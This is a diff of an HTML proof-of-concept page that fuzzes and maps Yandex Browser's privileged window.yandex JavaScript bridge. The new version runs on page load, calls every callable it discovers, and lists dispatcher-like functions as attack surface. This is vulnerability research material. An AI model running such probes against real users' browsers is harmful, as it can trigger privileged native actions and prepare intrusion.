@@ -1,277 +1,200 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>PoC - window.yandex.getDeviceInfo fuzz</title>
-
   <style>
     body {
-      font-family: sans-serif;
-      padding: 16px;
+      font-family: system-ui, sans-serif;
+      background: #0e0e0e;
+      color: #e6e6e6;
+      padding: 20px;
     }
     h1 {
       margin: 0 0 8px 0;
+      font-size: 22px;
     }
     pre {
-      white-space: pre-wrap;
-      word-break: break-word;
       background: #111;
       color: #0f0;
-      padding: 12px;
+      padding: 14px;
       border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      max-height: 70vh;
+      overflow: auto;
     }
-    button {
-      font-size: 16px;
-      padding: 10px 14px;
-      margin: 8px 8px 8px 0;
+    .meta {
+      font-size: 13px;
+      opacity: 0.8;
+      margin-bottom: 10px;
     }
   </style>
 </head>
 
 <body>
-  <h1>getDeviceInfo Bridge Fuzzer</h1>
-  <div>Autodiscover object / function / callback / promise / message semantics</div>
-  <div>TS: <span id="ts"></span></div>
+  <h1>Yandex Bridge Auto‑Extraction</h1>
+  <div class="meta">
+    Runs automatically on page load · timestamp:
+    <span id="ts"></span>
+  </div>
 
-  <button onclick="run()">Run</button>
-  <pre id="out">Ready.</pre>
+  <pre id="out">Waiting for execution…</pre>
 
 <script>
 (function () {
+  const outEl = document.getElementById("out");
   document.getElementById("ts").textContent = String(Date.now());
-})();
 
-function out(s) {
-  const el = document.getElementById("out");
-  el.textContent += s + "\n";
-}
-
-function setOut(s) {
-  document.getElementById("out").textContent = s + "\n";
-}
-
-function safe(v) {
-  try {
-    if (v === undefined) return "undefined";
-    if (v === null) return "null";
-    if (typeof v === "string") return JSON.stringify(v);
-    if (typeof v === "number" || typeof v === "boolean") return String(v);
-    if (typeof v === "function")
-      return "[function " + (v.name || "anonymous") + "]";
-    return String(v);
-  } catch (e) {
-    return "[unprintable:" + e + "]";
-  }
-}
-
-function j(o) {
-  try {
-    return JSON.stringify(o);
-  } catch (e) {
-    return "[json_fail:" + e + "]";
-  }
-}
-
-function ownKeys(o) {
-  try {
-    return Reflect.ownKeys(o);
-  } catch (e) {
-    return ["<ownKeys error " + e + ">"];
-  }
-}
-
-function once(fn) {
-  let done = false;
-  return function () {
-    if (done) return;
-    done = true;
-    return fn.apply(this, arguments);
-  };
-}
-
-async function tryCall(fn, thisObj, args, label) {
-  try {
-    const r = fn.apply(thisObj, args);
-
-    if (r && typeof r.then === "function") {
-      const v = await r;
-      out("[OK] " + label + " (promise) => " + safe(v));
-      return { ok: true, value: v };
-    }
-
-    out("[OK] " + label + " => " + safe(r));
-    return { ok: true, value: r };
-  } catch (e) {
-    out("[EX] " + label + " threw: " + e);
-    return { ok: false, error: e };
-  }
-}
-
-async function run() {
-  setOut("");
-
-  // 1) window.yandex
-  let y;
-  try {
-    y = window.yandex;
-  } catch (e) {
-    out("ERROR reading window.yandex: " + e);
-    return;
+  function log(s) {
+    outEl.textContent += s + "\n";
   }
 
-  out("typeof window.yandex = " + typeof y);
-  if (!y) {
-    alert("No window.yandex");
-    return;
-  }
-
-  // 2) getDeviceInfo symbol
-  let g;
-  try {
-    g = y.getDeviceInfo;
-  } catch (e) {
-    out("ERROR reading y.getDeviceInfo: " + e);
-    return;
-  }
-
-  out("typeof y.getDeviceInfo = " + typeof g + " " + safe(g));
-  if (!g) {
-    alert("No yandex.getDeviceInfo");
-    return;
-  }
-
-  // 3) Enumerate keys / prototype
-  const gKeys = typeof g === "object" ? ownKeys(g) : [];
-  out("ownKeys(getDeviceInfo) = " + j(gKeys));
-
-  let proto = null;
-  try {
-    proto = Object.getPrototypeOf(g);
-  } catch (e) {}
-
-  const pKeys = proto ? ownKeys(proto) : [];
-  out("ownKeys(getDeviceInfo.__proto__) = " + j(pKeys));
-
-  // 4) Callback
-  const cb = once(function (res) {
-    out("** CALLBACK RESULT ** " + safe(res));
-
+  function safe(fn) {
     try {
-      if (typeof res === "string") {
-        const parsed = JSON.parse(res);
-        out("parsed JSON = " + j(parsed));
-      }
+      return fn();
     } catch (e) {
-      out("parse JSON failed: " + e);
-    }
-
-    alert(("DeviceInfo: " + safe(res)).slice(0, 300));
-  });
-
-  // 5) Argument fuzz sets
-  const argSets = [
-    [],
-    [cb],
-    [{ callback: cb }],
-    [{ onResult: cb }],
-    [{ success: cb }],
-    [{ complete: cb }],
-    [{}],
-    [{ async: true }],
-    [{ format: "json" }],
-    [{ verbose: true }],
-    [{ source: "web" }],
-    [{}, cb],
-  ];
-
-  // 6) If function: direct fuzz
-  if (typeof g === "function") {
-    out("Fuzzing getDeviceInfo as FUNCTION");
-
-    for (let i = 0; i < argSets.length; i++) {
-      await tryCall(
-        g,
-        y,
-        argSets[i],
-        "getDeviceInfo args#" + i
-      );
+      return { __error: String(e) };
     }
   }
 
-  // 7) If object: fuzz methods
-  if (typeof g === "object") {
-    out("Fuzzing getDeviceInfo as OBJECT");
+  function isCallable(v) {
+    return typeof v === "function";
+  }
 
-    const methodNames = [
-      "get",
-      "fetch",
-      "query",
-      "call",
-      "invoke",
-      "exec",
-      "postMessage",
-      "send",
-      "run",
-      "request",
-      ...gKeys,
-      ...pKeys,
-    ];
+  function looksLikeDispatcher(name, fn) {
+    return (
+      isCallable(fn) &&
+      /post|send|call|invoke|dispatch|message/i.test(name)
+    );
+  }
 
-    const uniq = [];
-    for (const n of methodNames) {
-      if (n && !uniq.includes(n)) uniq.push(n);
+  function probeCall(fn, ctx) {
+    try {
+      const r = fn.call(ctx);
+      if (r && typeof r.then === "function") return "promise";
+      return "sync";
+    } catch {
+      return "throws";
+    }
+  }
+
+  function extractYandexBridge() {
+    const results = {
+      callable: [],
+      dispatchers: [],
+      namespaces: [],
+      suspicious: [],
+      protoCallables: [],
+    };
+
+    let y;
+    try {
+      y = window.yandex;
+    } catch (e) {
+      log("[!] window.yandex inaccessible: " + e);
+      return results;
     }
 
-    out("candidate methods = " + j(uniq));
+    if (!y) {
+      log("[!] window.yandex not present");
+      return results;
+    }
 
-    for (const name of uniq) {
-      let fn;
+    log("[*] window.yandex detected");
+
+    // 1) Own keys (Proxy-aware)
+    const ownKeys = safe(() => Reflect.ownKeys(y)) || [];
+    log("[*] ownKeys: " + JSON.stringify(ownKeys));
+
+    for (const k of ownKeys) {
+      let v;
       try {
-        fn = g[name];
+        v = y[k];
       } catch (e) {
+        results.suspicious.push({ name: k, reason: "getter throws" });
         continue;
       }
 
-      if (typeof fn !== "function") continue;
+      if (isCallable(v)) {
+        const behavior = probeCall(v, y);
+        results.callable.push({ name: k, behavior });
 
-      for (let i = 0; i < argSets.length; i++) {
-        await tryCall(
-          fn,
-          g,
-          argSets[i],
-          "getDeviceInfo." + name + " args#" + i
-        );
+        if (looksLikeDispatcher(k, v)) {
+          results.dispatchers.push({ name: k, behavior });
+        }
+        continue;
+      }
+
+      if (v === undefined) {
+        results.namespaces.push({ name: k, type: "virtual namespace" });
+        continue;
+      }
+
+      if (typeof v === "object") {
+        results.suspicious.push({
+          name: k,
+          type: "object namespace",
+          keys: safe(() => Reflect.ownKeys(v)),
+        });
       }
     }
-  }
 
-  // 8) Message-style payload fuzz
-  const payloads = [
-    "getDeviceInfo",
-    ["getDeviceInfo"],
-    { cmd: "getDeviceInfo" },
-    { method: "getDeviceInfo" },
-    { action: "getDeviceInfo" },
-    { type: "getDeviceInfo" },
-    { name: "getDeviceInfo" },
-    { api: "getDeviceInfo" },
-    { namespace: "yandex", cmd: "getDeviceInfo" },
-  ];
+    // 2) Prototype inspection
+    let proto;
+    try {
+      proto = Object.getPrototypeOf(y);
+    } catch {}
 
-  if (typeof g === "function") {
-    for (let i = 0; i < payloads.length; i++) {
-      await tryCall(
-        g,
-        y,
-        [payloads[i], cb],
-        "getDeviceInfo payload#" + i
-      );
+    if (proto) {
+      const protoKeys = safe(() => Reflect.ownKeys(proto)) || [];
+      log("[*] protoKeys: " + JSON.stringify(protoKeys));
+
+      for (const k of protoKeys) {
+        let v;
+        try {
+          v = proto[k];
+        } catch {
+          continue;
+        }
+
+        if (isCallable(v)) {
+          const behavior = probeCall(v, y);
+          results.protoCallables.push({ name: k, behavior });
+
+          if (looksLikeDispatcher(k, v)) {
+            results.dispatchers.push({
+              name: k,
+              behavior,
+              source: "prototype",
+            });
+          }
+        }
+      }
     }
+
+    return results;
   }
 
-  out("DONE. If nothing fired, bridge is likely origin-gated or signature-locked.");
-  alert("Done. Check output.");
-}
+  log("[*] Starting Yandex bridge extraction…");
+  const results = extractYandexBridge();
+
+  log("\n=== CALLABLE ROOT FUNCTIONS ===");
+  log(JSON.stringify(results.callable, null, 2));
+
+  log("\n=== DISPATCHER CANDIDATES (REAL ATTACK SURFACE) ===");
+  log(JSON.stringify(results.dispatchers, null, 2));
+
+  log("\n=== VIRTUAL NAMESPACES (NOT CALLABLE) ===");
+  log(JSON.stringify(results.namespaces, null, 2));
+
+  log("\n=== PROTOTYPE CALLABLES ===");
+  log(JSON.stringify(results.protoCallables, null, 2));
+
+  log("\n=== SUSPICIOUS OBJECTS ===");
+  log(JSON.stringify(results.suspicious, null, 2));
+
+  log("\n[*] Extraction complete");
+})();
 </script>
 </body>
 </html>
